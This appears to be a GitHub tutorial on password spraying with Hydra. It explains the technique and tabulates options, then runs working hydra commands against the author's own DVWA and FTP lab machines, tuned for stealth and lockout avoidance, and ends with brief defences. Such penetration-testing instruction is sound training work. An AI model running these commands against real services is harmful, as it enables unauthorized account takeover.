<h1 align="center"> Hydra For Password Spraying </h1>

![hydra-contrasenas](https://github.com/user-attachments/assets/2e265649-2b42-4490-a69e-40ae999720c4)



## What is password Spraying?
Password spraying is a type of brute-force attack where an attacker tries one or a few common passwords across many usernames, rather than trying many passwords against a single user. This technique helps avoid account lockouts and detection.



## How Password Spraying Works
1. Gather usernames
  - From OSINT, leaked databases, or enumeration (e.g., user.txt)
2. Choose a few common passwords
  - Examples: Password123, Welcome1, Spring2025!, admin, 123456
3. Attempt login across all users
  - Try Password123 for all users 
  - Then try Welcome1 for all users
  - Repeat with a few more passwords
4. Avoid lockouts
  - Most systems lock accounts after multiple failed attempts per user, not across users
  - Spraying avoids this by limiting attempts per account

## Why Itâ€™s Dangerous
- Many users still use weak or default passwords
- Itâ€™s stealthy, avoids detection by spreading attempts
- Works well against:
  - Web portals (e.g., OWA, VPN, Citrix)
  - SSH, RDP, FTP
  - Cloud services (e.g., Microsoft 365, Google Workspace)




## Installation 

### Install via Kali Linux
- Update to late version
````
sudo apt update && sudo apt install hydra
````
<img width="658" height="283" alt="image" src="https://github.com/user-attachments/assets/bcfd4f12-0434-4a6d-8ca1-926ddb87549c" />

- Check
````
hydra -h
````
<img width="1908" height="765" alt="image" src="https://github.com/user-attachments/assets/e5634da3-3467-40ae-acd9-d07f079cbe98" />

<img width="1919" height="449" alt="image" src="https://github.com/user-attachments/assets/268d1de0-5bb6-4c16-8f52-5d561767fd01" />




## Options Usage

### General Options
| Option               | Meaning                                                         |
| -------------------- | --------------------------------------------------------------- |
| `-R`                 | Restore a previous aborted/crashed session                      |
| `-I`                 | Ignore existing restore file (skip 10-second wait)              |
| `-S`                 | Use SSL connection                                              |
| `-s PORT`            | Specify port if service runs on non-default port                |
| `-l LOGIN`           | Use a single username                                           |
| `-L FILE`            | Load username list from file                                    |
| `-p PASS`            | Use a single password                                           |
| `-P FILE`            | Load password list from file                                    |
| `-x MIN:MAX:CHARSET` | Generate brute-force passwords                                  |
| `-y`                 | Disable symbols in brute-force mode                             |
| `-r`                 | Use non-random shuffle for `-x`                                 |
| `-e nsr`             | Extra tries: **n** = null, **s** = user==pass, **r** = reversed |
| `-u`                 | Loop around users first (default when using `-x`)               |
| `-C FILE`            | File with `username:password` pairs                             |



### Multiple Targets
| Option    | Meaning                                           |
| --------- | ------------------------------------------------- |
| `-M FILE` | List of targets, 1 per line, `:` to specify port  |
| `-D XofY` | Divide wordlist into Y parts and use the Xth part |


### Output Control
| Option      | Meaning                                     |
| ----------- | ------------------------------------------- |
| `-o FILE`   | Save found credentials to file              |
| `-b FORMAT` | Output format: `text`, `json`, `jsonv1`     |
| `-f`        | Stop when a valid login is found (per host) |
| `-F`        | Stop entirely once *any* login is found     |


### Performance Options
| Option     | Meaning                                           |
| ---------- | ------------------------------------------------- |
| `-t TASKS` | Threads per host (default: 16)                    |
| `-T TASKS` | Total threads for multi-target mode (default: 64) |
| `-w TIME`  | Response wait time (default: 32 sec)              |
| `-W TIME`  | Delay between connects per thread                 |
| `-c TIME`  | Global timeout per login attempt (forces `-t 1`)  |


### Network & Protocol Options
| Option    | Meaning                                             |
| --------- | --------------------------------------------------- |
| `-4`      | Use IPv4                                            |
| `-6`      | Use IPv6                                            |
| `-v`      | Verbose                                             |
| `-V`      | Show every username/password being tested           |
| `-d`      | Debug mode                                          |
| `-O`      | Use old SSL v2/v3                                   |
| `-K`      | Do not retry failed attempts                        |
| `-q`      | Silence connection error messages                   |
| `-U`      | Show module-specific help                           |
| `-m OPT`  | Module-specific options                             |
| `server`  | Target (IP, DNS, or subnet like `192.168.1.0/24`)   |
| `service` | Protocol to attack (ftp, ssh, http-post-form, etc.) |
| `OPT`     | Extra service options                               |


### Common Service Examples
| Service   | Example Syntax                                                          |
| --------- | ----------------------------------------------------------------------- |
| SSH       | `ssh://192.168.1.10`                                                    |
| FTP       | `ftp://10.0.0.5`                                                        |
| HTTP POST | `http-post-form://site/login.php:field1=^USER^&field2=^PASS^:F=invalid` |
| SMB       | `smb://192.168.1.20`                                                    |



---








<h1 align="center"> Hydra Methodology </h1>


## Hydra Syntax for Password Spraying

### Basic Syntax
````
hydra -L <user_list> -p <single_password> <target> <service> <options>
````
Key Parameters:
- `-L` = List of usernames
- `-p` = Single password to spray
- `-P` = File with multiple passwords (for traditional brute force)
- `-t` = Number of parallel tasks
- `-w` = Wait time between attempts
- `-f` = Stop after first found password
- `-v` = Verbose mode

---




## Identify Target Service ðŸŽ¯

Common services Hydra supports:
- `http-form-get` / `http-form-post`: Web logins
- `sh`: SSH servers
- `ftp`: FTP servers
- `smb`: Windows file sharing
- `rdp`: Remote Desktoppop3 - Email
- `imap`: Email

---



## HTTP Login Form Spraying

### Password Spraying with no cookie:
- In this i test with my DVWA: http://192.168.127.129/dvwa/login.php
<img width="1571" height="652" alt="image" src="https://github.com/user-attachments/assets/071b1d03-e339-49a4-aace-c3f0160d7bcd" />

- After press `F12`:
<img width="1919" height="615" alt="image" src="https://github.com/user-attachments/assets/50b30854-8ef7-4293-a007-c8ad971c267d" />

- After press `Ctrl + U`:
<img width="1602" height="492" alt="image" src="https://github.com/user-attachments/assets/23dfbcce-e3f2-42a2-b04e-b504816c272f" />

- Spray 'password' against all users on a web login
````
hydra -L users.txt -p password 192.168.1.100 http-form-post "/login.php:username=^USER^&password=^PASS^:F=Login failed" -t 1 -w 10 -v
````
<img width="1679" height="530" alt="image" src="https://github.com/user-attachments/assets/102ab1f5-5bf4-4468-b4ef-6335326cd085" />

- In this we found the correct `Username` of this Password: `password`.
- `http-form-post`: HTTP POST form login
- `"/login.php:username=^USER^&password=^PASS^:F=incorrect"`: Login details
- `-t 1`: Use only 1 thread (avoid detection)
- `-w 10`: Wait 10 seconds between attempts
- `-v`: Show verbose output


### With session cookie:
- In this i used with this: http://192.168.100.97:8080/vulnerabilities/brute/
<img width="810" height="642" alt="image" src="https://github.com/user-attachments/assets/042e8567-14fc-4ef2-b8a7-66b4a4a02617" />

- After press `F12` or `Inspect` after type this:
````
document.cookie
````
<img width="1918" height="427" alt="image" src="https://github.com/user-attachments/assets/8d120e36-d0ae-4702-80e4-e821fb203e13" />

````
hydra -L /usr/share/wordlists/user.txt -p password 'http-get-form://192.168.100.97:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=2lhhrcmsbiun1nk6mssj3ae7m0:F=Username and/or password incorrect' -V -f
````
<img width="1921" height="562" alt="image" src="https://github.com/user-attachments/assets/7d521ce4-5be0-4d2c-a37d-7c3def056927" />

- If i login in this:
<img width="1161" height="773" alt="image" src="https://github.com/user-attachments/assets/7f4029d3-e2bb-4641-8884-309a757ae11f" />

- Now we got success to login to target.
---


##  FTP Spraying
````
hydra -L /usr/share/wordlists/user.txt -p msfadmin 192.168.127.129 ftp -t 1 -w 15 -v
````
<img width="1709" height="290" alt="image" src="https://github.com/user-attachments/assets/16955c9d-62a5-4b56-9ab1-bfe88de634b7" />

- In this just test show if in real if other userpassword like `Welcome`, `Password`, `Spring2025` or use others, we can crack or brute force it.
- `-t 1`: Runs 1 task/thread at a time (slow but safe)
- `-w 15`: Waits 15 seconds on connection errors before retrying
- `-v`: Verbose mode, shows each login attempt in the terminal

- Login:
````
ftp 192.168.127.129
````
<img width="1654" height="649" alt="image" src="https://github.com/user-attachments/assets/2583123a-a8e2-416b-9fc0-8f11537c2578" />

---


## How to Defend Against It
- Enforce **strong password policies**
- Enable **multi-factor authentication (MFA)**
- Monitor for **failed login patterns across accounts**
- Use **account lockout thresholds** and **IP rate limiting**
- Deploy **CAPTCHA** or **login throttling**.


---

<h2 align="center"> End Of Hydra for Password Spraying </h2>


---

<h2 align="center"> Credit: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 15/11/2025 </h3>
